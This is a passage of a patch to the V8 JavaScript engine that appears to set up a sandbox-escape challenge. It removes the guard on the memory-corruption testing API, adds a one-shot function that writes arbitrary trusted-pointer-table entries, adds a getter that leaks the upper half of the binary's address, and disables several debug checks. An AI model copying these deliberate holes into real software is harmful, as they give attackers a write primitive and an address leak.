+@@ -436,18 +436,18 @@ DEFINE_CHECK_OP_IMPL(GT, > )
+ 
+ // The DCHECK macro is equivalent to CHECK except that it only
+ // generates code in debug builds.
+-#ifdef DEBUG
+-#define DCHECK_EQ(lhs, rhs) DCHECK_OP(EQ, ==, lhs, rhs)
+-#define DCHECK_NE(lhs, rhs) DCHECK_OP(NE, !=, lhs, rhs)
+-#define DCHECK_GT(lhs, rhs) DCHECK_OP(GT, >, lhs, rhs)
+-#define DCHECK_GE(lhs, rhs) DCHECK_OP(GE, >=, lhs, rhs)
+-#define DCHECK_LT(lhs, rhs) DCHECK_OP(LT, <, lhs, rhs)
+-#define DCHECK_LE(lhs, rhs) DCHECK_OP(LE, <=, lhs, rhs)
+-#define DCHECK_NULL(val) DCHECK((val) == nullptr)
+-#define DCHECK_NOT_NULL(val) DCHECK((val) != nullptr)
+-#define DCHECK_IMPLIES(lhs, rhs) \
+-  DCHECK_WITH_MSG(!(lhs) || (rhs), #lhs " implies " #rhs)
+-#else
++//#ifdef DEBUG
++//#define DCHECK_EQ(lhs, rhs) DCHECK_OP(EQ, ==, lhs, rhs)
++//#define DCHECK_NE(lhs, rhs) DCHECK_OP(NE, !=, lhs, rhs)
++//#define DCHECK_GT(lhs, rhs) DCHECK_OP(GT, >, lhs, rhs)
++//#define DCHECK_GE(lhs, rhs) DCHECK_OP(GE, >=, lhs, rhs)
++//#define DCHECK_LT(lhs, rhs) DCHECK_OP(LT, <, lhs, rhs)
++//#define DCHECK_LE(lhs, rhs) DCHECK_OP(LE, <=, lhs, rhs)
++//#define DCHECK_NULL(val) DCHECK((val) == nullptr)
++//#define DCHECK_NOT_NULL(val) DCHECK((val) != nullptr)
++//#define DCHECK_IMPLIES(lhs, rhs) \
++//  DCHECK_WITH_MSG(!(lhs) || (rhs), #lhs " implies " #rhs)
++//#else
+ #define DCHECK(condition)      ((void) 0)
+ #define DCHECK_WITH_LOC(condition, location) ((void)0)
+ #define DCHECK_WITH_MSG_AND_LOC(condition, message, location) ((void)0)
+@@ -460,7 +460,7 @@ DEFINE_CHECK_OP_IMPL(GT, > )
+ #define DCHECK_NULL(val)       ((void) 0)
+ #define DCHECK_NOT_NULL(val)   ((void) 0)
+ #define DCHECK_IMPLIES(v1, v2) ((void) 0)
+-#endif
++//#endif
+ 
+ // When the sandbox is enabled, a SBXCHECK behaves exactly like a CHECK, but
+ // indicates that the check is required for the sandbox, i.e. prevents a
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index baaca2bde67..42547e81bf1 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -2079,9 +2079,8 @@ MaybeLocal<Context> Shell::CreateRealm(
+     }
+     delete[] old_realms;
+   }
+-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+   Local<Context> context =
+-      Context::New(isolate, nullptr, global_template, global_object);
++      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), global_object);
+   if (context.IsEmpty()) return MaybeLocal<Context>();
+   DCHECK(!try_catch.HasCaught());
+   InitializeModuleEmbedderData(context);
+@@ -3745,9 +3744,8 @@ MaybeLocal<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
+       reinterpret_cast<i::Isolate*>(isolate)->main_thread_local_isolate(),
+       context_mutex_.Pointer());
+   // Initialize the global objects
+-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+   EscapableHandleScope handle_scope(isolate);
+-  Local<Context> context = Context::New(isolate, nullptr, global_template);
++  Local<Context> context = Context::New(isolate, nullptr, ObjectTemplate::New(isolate));
+   if (context.IsEmpty()) {
+     DCHECK(isolate->IsExecutionTerminating());
+     return {};
+diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc
+index fe18387b2bd..5352ef4f5eb 100644
+--- a/src/sandbox/testing.cc
++++ b/src/sandbox/testing.cc
+@@ -386,6 +386,49 @@ void SandboxGetTargetPage(const v8::FunctionCallbackInfo<v8::Value>& info) {
+   info.GetReturnValue().Set(v8::Number::New(isolate, page));
+ }
+ 
++// Sandbox.modifyTrustedPointerTable(handle, pointer, tag) -> Bool
++void SandboxModifyTrustedPointerTable(const v8::FunctionCallbackInfo<v8::Value>& info) {
++  static int times = 0;
++
++  if (times == 1) {
++    info.GetReturnValue().Set(false);
++    return;
++  }
++
++  DCHECK(ValidateCallbackInfo(info));
++
++  if (info.Length() != 3) {
++    info.GetReturnValue().Set(false);
++    return;
++  }
++
++  v8::Isolate* isolate = info.GetIsolate();
++  Local<v8::Context> context = isolate->GetCurrentContext();
++
++  Local<v8::Integer> handle, pointer, tag;
++  if (!info[0]->ToInteger(context).ToLocal(&handle) ||
++      !info[1]->ToInteger(context).ToLocal(&pointer) ||
++      !info[2]->ToInteger(context).ToLocal(&tag)) {
++    info.GetReturnValue().Set(false);
++    return;
++  }
++
++  TrustedPointerTable& table = reinterpret_cast<Isolate*>(isolate)->trusted_pointer_table();
++
++  table.Set((TrustedPointerHandle)handle->Value(), pointer->Value(), (IndirectPointerTag)tag->Value());
++
++  times += 1;
++  info.GetReturnValue().Set(true);
++}
++
++// Sandbox.H32BinaryAddress
++void SandboxGetH32BinaryAddress(const v8::FunctionCallbackInfo<v8::Value>& info) {
++  DCHECK(ValidateCallbackInfo(info));
++//  printf("SandboxGetH32BinaryAddress>>> %p\n", &SandboxGetH32BinaryAddress);
++  double h32_binary_addr = (double)((unsigned long long int)&SandboxGetH32BinaryAddress >> 32 << 32);
++  info.GetReturnValue().Set(v8::Number::New(info.GetIsolate(), h32_binary_addr));
++}
++
+ Handle<FunctionTemplateInfo> NewFunctionTemplate(
+     Isolate* isolate, FunctionCallback func,
+     ConstructorBehavior constructor_behavior) {
+@@ -448,8 +491,6 @@ void SandboxTesting::InstallMemoryCorruptionApiIfEnabled(Isolate* isolate) {
+        "where it could potentially be abused to facilitate exploitation."
+ #endif
+ 
+-  if (!IsEnabled()) return;
+-
+   CHECK(GetProcessWideSandbox()->is_initialized());
+ 
+   // Create the special Sandbox object that provides read/write access to the
+@@ -487,6 +528,10 @@ void SandboxTesting::InstallMemoryCorruptionApiIfEnabled(Isolate* isolate) {
+     InstallGetter(isolate, sandbox, SandboxGetTargetPage, "targetPage");
+   }
+ 
++  InstallGetter(isolate, sandbox, SandboxGetH32BinaryAddress, "H32BinaryAddress");
++  InstallFunction(isolate, sandbox, SandboxModifyTrustedPointerTable,
++                  "modifyTrustedPointerTable", 3);
++
+   // Install the Sandbox object as property on the global object.
+   Handle<JSGlobalObject> global = isolate->global_object();
+   Handle<String> name =
+diff --git a/src/sandbox/trusted-pointer-table-inl.h b/src/sandbox/trusted-pointer-table-inl.h
+index 122baa58088..2d1e61b5bfd 100644
+--- a/src/sandbox/trusted-pointer-table-inl.h
++++ b/src/sandbox/trusted-pointer-table-inl.h
+@@ -110,7 +110,7 @@ Address TrustedPointerTable::Get(TrustedPointerHandle handle,
+ 
+ void TrustedPointerTable::Set(TrustedPointerHandle handle, Address pointer,
+                               IndirectPointerTag tag) {
+-  DCHECK_NE(kNullTrustedPointerHandle, handle);
++//  DCHECK_NE(kNullTrustedPointerHandle, handle);
+   Validate(pointer, tag);
+   uint32_t index = HandleToIndex(handle);
+   at(index).SetPointer(pointer, tag);
